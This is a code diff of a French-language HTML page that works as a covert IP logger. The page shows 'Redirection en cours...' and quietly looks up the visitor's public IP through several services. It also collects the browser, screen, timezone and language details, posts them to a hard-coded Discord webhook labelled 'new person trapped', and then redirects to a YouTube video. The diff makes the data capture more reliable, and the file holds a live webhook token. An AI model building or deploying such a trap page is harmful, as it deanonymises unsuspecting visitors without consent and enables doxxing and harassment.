@@ -1,19 +1,76 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Chargement...</title><script>
-// === À CHANGER UNE SEULE FOIS ===
-const WEBHOOK = "https://discord.com/api/webhooks/1438558094736097323/7gEfEJ8JyVu9KOAkOVV1G9o3_89-VPoQwcCd1h4X5F_joUD2othf5nO2t46ffB3Q7E2v"; // ← change ça !
-const YOUTUBE = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // change si tu veux une autre vidéo
-const NOM = "Mon super lien 2025";
-// ================================
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Redirection...</title>
+    <script>
+        // === À CHANGER UNE FOIS ===
+        const WEBHOOK = "https://discord.com/api/webhooks/1438558094736097323/7gEfEJ8JyVu9KOAkOVV1G9o3_89-VPoQwcCd1h4X5F_joUD2othf5nO2t46ffB3Q7E2v"; // ← Obligatoire
+        const YOUTUBE = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ta vidéo
+        // ==========================
 
-async function getIP(){try{let r=await fetch('https://api.ipify.org');return await r.text()}catch(e){return"Inconnue"}}
-(async()=>{let ip=await getIP();let ua=navigator.userAgent;let date=new Date().toLocaleString('fr-FR');
-let logs=JSON.parse(localStorage.getItem('logs')||'[]');logs.push({ip,date,ua});localStorage.setItem('logs',JSON.stringify(logs));
-fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
-username:"IP Logger",embeds:[{title:"Nouvelle victime !",color:16711680,fields:[
-{name:"Piège",value:NOM},{name:"IP",value:"||"+ip+"||",inline:true},
-{name:"Heure",value:date,inline:true},{name:"Appareil",value:"||"+ua.substr(0,100)+"||"}
-]}]})});setTimeout(()=>{location=YOUTUBE},500)})();
-</script></head><body style="background:#000;color:#0f0;font-family:Arial;text-align:center;padding-top:200px">
-Chargement de la vidéo...
-</body></html>
+        // Méthode 2025 ultra-fiable : on utilise 4 services différents en parallèle
+        async function getRealIP() {
+            const services = [
+                "https://api.ipify.org",
+                "https://ipv4.icanhazip.com",
+                "https://api.myip.com",
+                "https://ipinfo.io/ip",
+                "https://ifconfig.me/ip"
+            ];
+
+            const promises = services.map(url => 
+                fetch(url, { cache: "no-store" }).then(r => r.text().trim()).catch(() => "erreur")
+            );
+
+            const results = await Promise.all(promises);
+            const validIp = results.find(r => /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(r));
+            return validIp || results[0] || "IP bloquée";
+        }
+
+        // Envoi Discord avec plein d'infos (même si IP bloquée tu sauras que c'est quelqu'un de prudent)
+        async function send() {
+            const ip = await getRealIP();
+            const info = {
+                ip: ip,
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                screen: screen.width + "x" + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                date: new Date().toLocaleString('fr-FR'),
+                url: location.href
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "IP Logger GitHub",
+                    embeds: [{
+                        title: "Nouvelle personne piégée !",
+                        color: ip.includes(".") ? 3066993 : 15158332, // vert si IP trouvée, rouge si bloquée
+                        fields: [
+                            { name: "IP détectée", value: "||" + info.ip + "||", inline: false },
+                            { name: "Date", value: info.date, inline: true },
+                            { name: "Appareil", value: "||" + info.ua.substring(0,120) + "||", inline: false },
+                            { name: "Écran", value: info.screen, inline: true },
+                            { name: "Fuseau horaire", value: info.timezone, inline: true },
+                            { name: "Lien cliqué", value: info.url, inline: false }
+                        ],
+                        footer: { text: ip.includes(".") ? "IP réelle capturée" : "IP bloquée (VPN ou bloqueur)" }
+                    }]
+                })
+            });
+        }
+
+        // Lancement immédiat
+        send();
+
+        // Redirection après 400ms (le temps que Discord reçoive)
+        setTimeout(() => { location.href = YOUTUBE; }, 400);
+    </script>
+</head>
+<body style="background:black;color:white;font-family:Arial;text-align:center;padding-top:200px">
+    Redirection en cours...
+</body>
+</html>
